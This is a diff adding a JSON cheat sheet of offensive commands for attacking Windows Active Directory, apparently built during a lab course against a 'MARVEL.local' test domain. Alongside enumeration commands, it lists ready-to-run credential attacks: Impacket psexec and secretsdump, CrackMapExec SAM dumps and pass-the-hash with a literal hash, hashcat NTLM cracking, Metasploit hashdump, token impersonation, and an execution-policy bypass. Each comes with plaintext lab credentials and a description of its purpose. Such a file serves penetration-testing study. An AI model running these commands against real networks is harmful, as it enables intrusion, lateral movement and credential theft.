@@ -1,0 +1,308 @@
+[
+  {
+    "label": "PowerView Users",
+    "command": "Get-DomainUser -Properties name,badpwdcount",
+    "description": "List Properties of Users, in this case, select name and badpwdcount.",
+    "tags": [
+      "AD",
+      "PowerView"
+    ],
+    "color": "#c93131",
+    "id": "e2f403e2-3e72-457d-a18f-ba0e0844db9d"
+  },
+  {
+    "label": "PowerView Computers",
+    "command": "Get-NetComputer | select operatingsystem,operatingsystemversion",
+    "description": "list operatingSystem",
+    "tags": [
+      "AD",
+      "PowerView"
+    ],
+    "color": "#ee2f2f",
+    "id": "14176828-e30a-4405-a147-d1b6ade357cc"
+  },
+  {
+    "label": "PowerView Groups",
+    "command": "Get-NetGroupMember",
+    "description": "find members of a group",
+    "tags": [
+      "AD",
+      "PowerView"
+    ],
+    "color": "#f94343",
+    "id": "2d4e2d69-5292-4420-8a75-cefb5735037b"
+  },
+  {
+    "label": "PowerView GPO",
+    "command": "Get-NetGPO\nGet-NetGPO | select displayname, whenchanged",
+    "description": "list GPO policies, and their infos",
+    "tags": [
+      "AD",
+      "PowerView"
+    ],
+    "color": "#ff7a7a",
+    "id": "f4859405-194b-48b9-99d9-1955d0bf6e9c"
+  },
+  {
+    "label": "PowerShell fixColors",
+    "command": "Remove-Module PSReadLine",
+    "description": "Fixe text not showing when changing fonts background in windows cmd or gitbash terminals",
+    "tags": [
+      "AD",
+      "PowerShell"
+    ],
+    "color": "#412525",
+    "id": "f3ea9de8-f050-4b01-bfa4-c98483a36296"
+  },
+  {
+    "label": "PowerView Share",
+    "command": "Get-NetShare -ComputerName Spiderman",
+    "description": "Get shares on specific computer",
+    "tags": [
+      "AD",
+      "PowerView"
+    ],
+    "color": "#ff3d3d",
+    "id": "014bf693-7d0d-4a07-b3e3-8ac7811ed87a"
+  },
+  {
+    "label": "temp",
+    "command": "cd /usr/share/sharphound/",
+    "tags": [],
+    "id": "36e6f019-34c9-4eed-a0b1-b0666c716501",
+    "description": ""
+  },
+  {
+    "label": "simple info",
+    "command": "whoami\nwhoami /user\nwhoami /groups\necho USERNAME=%USERNAME%\necho USERDOMAIN=%USERDOMAIN%\necho LOGONSERVER=%LOGONSERVER%",
+    "tags": [
+      "Windows"
+    ],
+    "id": "e6fd9a7b-fca7-4452-8e44-0c8ddab7b7ee",
+    "description": ""
+  },
+  {
+    "label": "Domain join and machine role",
+    "command": "systeminfo | findstr /B /C:\"Host Name\" /C:\"Domain\" /C:\"Logon Server\"\nwmic computersystem get name,domain,partofdomain,domainrole\n",
+    "tags": [
+      "Windows"
+    ],
+    "id": "586364fd-49e7-4a43-bf3e-1a65f5caefc0",
+    "description": ""
+  },
+  {
+    "label": "local users",
+    "command": "net user\nwmic useraccount where \"LocalAccount=True\" get Name,SID,Disabled\n",
+    "tags": [
+      "Windows"
+    ],
+    "id": "04dda66f-ae93-41d8-a27f-04c3faf0568b",
+    "description": ""
+  },
+  {
+    "label": "local admins",
+    "command": "net localgroup administrators",
+    "tags": [
+      "Windows"
+    ],
+    "id": "f93572c8-03a5-4bbf-af37-6b2b90c87c8a",
+    "description": ""
+  },
+  {
+    "label": "Impacket PsExec Shell",
+    "command": "impacket-psexec 'MARVEL/fcastle:Password1@10.0.2.73'\n",
+    "description": "Executes a remote interactive shell on a Windows target using the SMB protocol and Service Control Manager (SCM). It requires valid credentials and writable share access (typically ADMIN$) to upload and execute a temporary service binary. This tool provides a semi-interactive cmd.exe session, running with SYSTEM privileges by default. It is a primary method for lateral movement within Active Directory environments when administrative access is available.",
+    "tags": [
+      "AD",
+      "Windows",
+      "Impacket",
+      "Lateral_Movement",
+      "RCE",
+      "SMB"
+    ],
+    "color": "#c3e170",
+    "id": "862e479d-353d-4a13-82be-9de392741099"
+  },
+  {
+    "label": "CME SAM Dump",
+    "command": "crackmapexec smb 10.0.2.0/24 -u fcastle -d MARVEL.local -p Password1 --sam",
+    "description": "Scans the specified subnet via the SMB protocol and attempts to authenticate to each host using the provided domain credentials. If the account has local administrator privileges on a target, it extracts the Security Account Manager (SAM) database. This reveals NTLM hashes for local user accounts (including the local Administrator), which can be used for offline cracking or Pass-the-Hash attacks.",
+    "tags": [
+      "AD",
+      "Windows",
+      "CrackMapExec",
+      "Credential_Dumping",
+      "SMB"
+    ],
+    "color": "#b6ea75",
+    "id": "70194f12-9482-4134-a5ad-fac1bee6fa10"
+  },
+  {
+    "label": "Impacket Secretsdump",
+    "command": "impacket-secretsdump marvel/fcastle:Password1@10.0.2.72",
+    "description": "Performs remote credential dumping from a Windows target without executing a binary agent, utilizing techniques like reading the registry or the DCSync method. It retrieves NTLM hashes, Kerberos keys, and plaintext secrets from the SAM database, LSA secrets, and, if targeting a Domain Controller, the NTDS.dit file. This is a critical tool for harvesting credentials to facilitate privilege escalation and lateral movement.",
+    "tags": [
+      "AD",
+      "Windows",
+      "Impacket",
+      "Credential_Dumping",
+      "DCSync",
+      "SMB"
+    ],
+    "color": "#9cf047",
+    "id": "9022768a-6f5b-447d-9e98-fc9174c01ff4"
+  },
+  {
+    "label": "Hashcat NTLM Cracking",
+    "command": "hashcat -m 1000 ~/AD-CyberMentor/hashes.txt /usr/share/wordlists/rockyou.txt -O --potfile-disable",
+    "description": "Performs a dictionary-based cracking attack against NTLM hashes (mode 1000) utilizing the RockYou wordlist. This mode is specifically used for Windows hashes typically harvested from the SAM database or NTDS.dit via tools like impacket-secretsdump. The -O flag enables optimized kernels for higher performance (at the cost of limiting password length), while --potfile-disable prevents saving cracked credentials to the local history. This is the standard offline method for recovering plaintext passwords from captured Windows hashes.",
+    "tags": [
+      "Password_Cracking",
+      "Hashcat",
+      "NTLM"
+    ],
+    "color": "#f07c0f",
+    "id": "ee1646f0-6d96-47cb-905c-f8b47667ba13"
+  },
+  {
+    "label": "CME Local Pass-The-Hash",
+    "command": "crackmapexec smb 10.0.2.0/24 -u \"Frank Castle\" -H 64f12cddaa88057e06a81b54e73b949b --local-auth",
+    "description": "Uses the Pass-the-Hash technique to authenticate against a range of IP addresses via SMB using a specific NTLM hash instead of a password. The --local-auth flag forces the tool to validate credentials against the local SAM database of each target rather than a Domain Controller. This is essential for detecting local administrator password reuse across different machines in a network without needing the plaintext password.",
+    "tags": [
+      "AD",
+      "Windows",
+      "CrackMapExec",
+      "Pass_The_Hash",
+      "Lateral_Movement"
+    ],
+    "id": "4629e7ec-56f5-40a4-9d21-effd681ec5ae"
+  },
+  {
+    "label": "Meterpreter PsExec Hashdump",
+    "command": "use exploit/windows/smb/psexec\nset smbdomain marvel.local\nset smbuser / password / rhosts / hosts\nrun\nhashdump",
+    "description": "Initiates the Metasploit Framework to perform lateral movement using the exploit/windows/smb/psexec module. This requires valid credentials to authenticate via SMB and execute a payload through the Service Control Manager, typically yielding a SYSTEM-level Meterpreter session. Once the session is established, the hashdump command attempts to extract NTLM hashes from the local SAM database. This sequence combines remote code execution with immediate credential harvesting for further pivoting.",
+    "tags": [
+      "Metasploit",
+      "Windows",
+      "SMB",
+      "Lateral_Movement",
+      "Credential_Dumping",
+      "AD"
+    ],
+    "color": "#d79365",
+    "id": "861ed6ce-588c-4115-b245-0df48782762a"
+  },
+  {
+    "label": "Meterpreter Incognito Token Impersonate",
+    "command": "use exploit/windows/smb/psexec \nset smbdomain / smbuser / password / rhosts / hosts.. \nrun \nload incognito \nlist_tokens -u \nimpersonate_token marvel\\\\fcastle ",
+    "description": "Leverages a Metasploit Meterpreter session (established via psexec) to perform Token Impersonation attacks using the incognito extension. After listing available user tokens with list_tokens -u, the impersonate_token command is used to hijack the security context of a different logged-in user (e.g., marvel\\fcastle) without knowing their password. This allows for immediate privilege escalation or lateral movement if the target token has higher privileges or domain access. Note that when specifying the domain user, you must use a double backslash (\\\\) to properly escape the backslash character.",
+    "tags": [
+      "Metasploit",
+      "Windows",
+      "Privilege_Escalation",
+      "Token_Impersonation",
+      "Incognito"
+    ],
+    "color": "#f2b269",
+    "id": "6d3bf9df-8a8d-46cb-9ec3-e9a503c8ebcc"
+  },
+  {
+    "label": "net.exe AD enumeration",
+    "command": "net user / domain\nnet user jeffadmin /domain\nnet group /domain\nnet group \"Sales Department\" /domain",
+    "description": "manual enumeration using default net.exe binary in win10 client",
+    "tags": [
+      "AD",
+      "net.exe"
+    ],
+    "color": "#6ddcf8",
+    "id": "63453a4e-51b2-4b08-9ab5-f49bb16dbac5"
+  },
+  {
+    "label": "find ADsPath for manual enumeration with LDAP and .Net",
+    "command": "$PDC = [[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name\n$DN = ([adsi]'').distinguishedName\n$LDAP = \"LDAP://$PDC/$DN\"",
+    "tags": [
+      "AD",
+      "PowerShell"
+    ],
+    "color": "#f2df0d",
+    "id": "58b857de-923f-46c6-9b31-0af7eef44145",
+    "description": ""
+  },
+  {
+    "label": "Search for all properties of users objects",
+    "command": "$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n$PDC = $domainObj.PdcRoleOwner.Name\n$DN = ([adsi]'').distinguishedName\n$LDAP = \"LDAP://$PDC/$DN\"\n$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)\n$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)\n$dirsearcher.filter=\"samAccountType=805306368\"\n$result = $dirsearcher.FindAll()\nForeach($obj in $result)\n{\nForeach($prop in $obj.Properties)\n{\n$prop\n}\nWrite-Host \"-------------------------------\"\n}\n",
+    "tags": [
+      "AD",
+      "PowerShell"
+    ],
+    "color": "#c3e70d",
+    "id": "15c9925c-3275-46ae-af51-f6e43d38d7a1",
+    "description": ""
+  },
+  {
+    "label": "run powershell script",
+    "command": "powershell -ep bypass\n.\\enumeration.ps1",
+    "tags": [
+      "AD",
+      "PowerShell"
+    ],
+    "color": "#e7f434",
+    "id": "7bdce00d-f1ab-4e93-a6b7-ee3ddf15a355",
+    "description": ""
+  },
+  {
+    "label": "search groups member of a User",
+    "command": "$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)\n$dirsearcher.filter=\"name=jeffadmin\"\n$result = $dirsearcher.FindAll()\nForeach($obj in $result)\n{\nForeach($prop in $obj.Properties)\n{\n$prop.memberof\n}\nWrite-Host \"-------------------------------\"\n}\n\n",
+    "tags": [
+      "AD",
+      "PowerShell"
+    ],
+    "color": "#d4ea34",
+    "id": "d27515c5-f5a7-42da-a237-872db540f6ac",
+    "description": ""
+  },
+  {
+    "label": "Expose Filters as Argument: Then search by samAccountType, groups, members of group, ..",
+    "command": "\n1) Expose Filters as Argument: Then search by samAccountType users\n\nfunction LDAPSearch {\nparam (\n[string]$LDAPQuery\n)\n$PDC =\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name\n$DistinguishedName = ([adsi]'').distinguishedName\n$DirectoryEntry = New-Object\nSystem.DirectoryServices.DirectoryEntry(\"LDAP://$PDC/$DistinguishedName\")\n$DirectorySearcher = New-Object\nSystem.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)\nreturn $DirectorySearcher.FindAll()\n}\n\n2) To run it :\n\nPS > Import-Module .\\function.ps1\nPS > LDAPSearch -LDAPQuery \"(samAccountType=805306368)\"\n\n3) Search by object type (group in this case)\nPS > LDAPSearch -LDAPQuery \"(objectclass=group)\"\n\n>> This for instane can enumerate more groups than net.exe\n\n4) Enumerate every group, with user members \nPS>  foreach ($group in $(LDAPSearch -LDAPQuery\n\"(objectCategory=group)\")) {\n>> $group.properties | select {$_.cn}, {$_.member}\n>> }\n",
+    "tags": [
+      "AD",
+      "PowerShell"
+    ],
+    "color": "#f2eb2c",
+    "id": "be8e87b8-ba4a-4cc1-bf1a-cb29c39abc30",
+    "description": ""
+  },
+  {
+    "label": "find machines in domain that current user as admin privileges on",
+    "command": "Find-LocalAdminAccess",
+    "tags": [
+      "AD",
+      "PowerView"
+    ],
+    "color": "#eb7070",
+    "id": "609d61f5-a281-49a7-a429-984f2c2fdac5",
+    "description": ""
+  },
+  {
+    "label": "find loggedin users to machine",
+    "command": "Get-NetSession -ComputerName COMPUTERNAME -Verbose",
+    "tags": [
+      "AD",
+      "PowerView"
+    ],
+    "color": "#fda5a5",
+    "id": "304c4bfc-52f6-4d64-b775-21f6a862358a",
+    "description": ""
+  },
+  {
+    "label": "Logged in users in computer",
+    "command": ".\\PsLoggedon.exe \\\\files04",
+    "tags": [
+      "AD",
+      "PSLoggedon.exe"
+    ],
+    "color": "#37c3e6",
+    "id": "3bd84da3-8d86-4c43-8a29-511251a5e9cc",
+    "description": ""
+  }
+]
